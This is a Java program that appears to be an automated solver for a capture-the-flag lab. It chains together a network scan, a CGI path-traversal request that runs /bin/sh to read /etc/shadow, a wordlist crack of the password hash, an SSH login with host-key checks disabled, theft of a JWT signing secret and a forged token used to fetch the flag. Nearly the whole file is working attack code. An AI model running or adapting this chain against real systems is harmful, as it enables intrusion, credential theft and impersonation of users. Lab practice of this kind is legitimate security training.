import com.auth0.jwt.JWT;
import com.auth0.jwt.algorithms.Algorithm;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class Solver extends Thread {
	private PrintWriter out;
	private InputStreamReader in;
	private Character next;

	private static final int PORT = 1338;

	@Override
	public void run() {
		try (ServerSocket serverSocket = new ServerSocket()) {
			serverSocket.bind(new InetSocketAddress("0.0.0.0", PORT));
			System.err.println("!! Socket listening on " + PORT);
			try (Socket socket = serverSocket.accept();
				 PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
				 InputStreamReader in = new InputStreamReader(socket.getInputStream())
			) {
				this.out = out;
				this.in = in;
				solve();
			}
		} catch (Exception e) {
			//noinspection CallToPrintStackTrace
			e.printStackTrace();
		}
		System.err.println("\n!! Closed socket");
		System.exit(0);
	}

	private CompletableFuture<Character> readChar() {
		CompletableFuture<Character> future = new CompletableFuture<>();
		Executors.newCachedThreadPool().execute(() -> {
			try {
				char c = (char) in.read();
				if (!future.isCancelled()) {
					future.complete(c);
				} else {
					next = c;
				}
			} catch (Exception e) {
				e.printStackTrace();
				future.complete('X');
			}
		});
		return future;
	}

	private String read() throws Exception {
		return read(1);
	}

	private String read(int timeoutS) throws Exception {
		CompletableFuture<Character> future;
		StringBuilder sb = new StringBuilder();
		while (true) {
			future = readChar();
			try {
				char obj = future.get(timeoutS, TimeUnit.SECONDS);
				if (next != null) {
					sb.append(next);
					next = null;
				}
				sb.append(obj);
			} catch (TimeoutException e) {
				future.cancel(true);
				String string = sb.toString();
				System.err.println(string);
				return string;
			}
		}
	}

	private void write(String cmd) {
		System.err.println(">" + cmd);
		out.println(cmd);
	}

	private void solve() throws Exception {
		read();
		write("ifconfig | grep addr: | grep -v 127 | cut -d ':' -f2 | cut -d ' ' -f1");
		String myIpLines = read();
		String myIp = myIpLines.split("\n")[0];

		write("nmap -sT " + myIp.replaceAll("\\.\\d+$", ".0/24"));
		String nmapLines = read(10);
		// in reality, this would require version detection, but we know mailus is the vulnerable one
		Matcher matcher = Pattern.compile(".*mailus.*\\((?<ip>.*)\\)").matcher(nmapLines);
		matcher.find();
		String mailusIp = matcher.group("ip");

		write("curl -Ss 'http://" + mailusIp + "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo; cat /etc/shadow | grep web;'");
		String shadowLines = read();

		String shadowHash = shadowLines.split("\n")[0].split(":")[1];
		System.err.println("!! Breaking " + shadowHash);
		String[] shadowParts = shadowHash.split("\\$");
		String algo = shadowParts[1];
		String salt = shadowParts[2];

		List<String> rockyou;
		try (InputStream rockyouIs = this.getContextClassLoader().getResourceAsStream("truncated-rockyou.txt")) {
			BufferedReader reader = new BufferedReader(new InputStreamReader(rockyouIs));
			rockyou = reader.lines().collect(Collectors.toList());
		}
		String correctPass = null;
		for (String candidate : rockyou) {
			String command = String.format("openssl passwd -%s -salt %s -noverify %s", algo, salt, candidate);
			System.err.println(command);
			Process proc = Runtime.getRuntime().exec(command).onExit().get();
			String computedHash = new String(proc.getInputStream().readAllBytes()).split("\n")[0];
			System.err.printf("Trying %s : %s%n", candidate, computedHash);
			if (shadowHash.equals(computedHash)) {
				correctPass = candidate;
				break;
			}
		}
		if (correctPass == null) {
			System.err.println("!! No password matched");
			System.exit(1);
			return;
		}
		System.err.printf("!! Password is %s%n", correctPass);

		// TODO find this out programmatically and use an ip
		String logusHost = "logus";

		write(String.format("sshpass -p%s ssh -o \"StrictHostKeyChecking no\" -o \"UserKnownHostsFile /dev/null\" web@%s cat /var/log/dashboard/proxy2021-12-09.log", correctPass, logusHost));
		String logLines = read();
		Matcher uidMatcher = Pattern.compile(".*jwt for (?<uid>.*)\"}").matcher(logLines);
		uidMatcher.find();
		String uid = uidMatcher.group("uid");
		System.err.printf("!! user id from log is %s%n", uid);

		// get jwt signing secret from authus
		write("cd /app/ && unzip *.jar >/dev/null && grep secret BOOT-INF/classes/application.properties");
		String secretLines = read();
		String secret = secretLines.split("\n")[0].split("=")[1];
		System.err.println("!! secret is " + secret);

		String jwt = JWT.create().withSubject(uid).sign(Algorithm.HMAC256(secret));
		System.err.println("!! created jwt " + jwt);

		HttpClient client = HttpClient.newHttpClient();
		HttpRequest request = HttpRequest
			.newBuilder()
			.GET()
			.uri(URI.create("http://dashboard/dashboard"))
			.header("cookie", "jwt=" + jwt)
			.build();
		System.err.println("!! GET dashboard/dashboard");
		HttpResponse<String> resp = client.send(request, HttpResponse.BodyHandlers.ofString());
		String body = resp.body();
		System.err.println(body);
		Matcher flagMatcher = Pattern.compile("flag is (?<flag>.*)</p>").matcher(body);
		flagMatcher.find();
		String flag = flagMatcher.group("flag");

		System.out.println(flag);
		System.exit(0);
	}
}
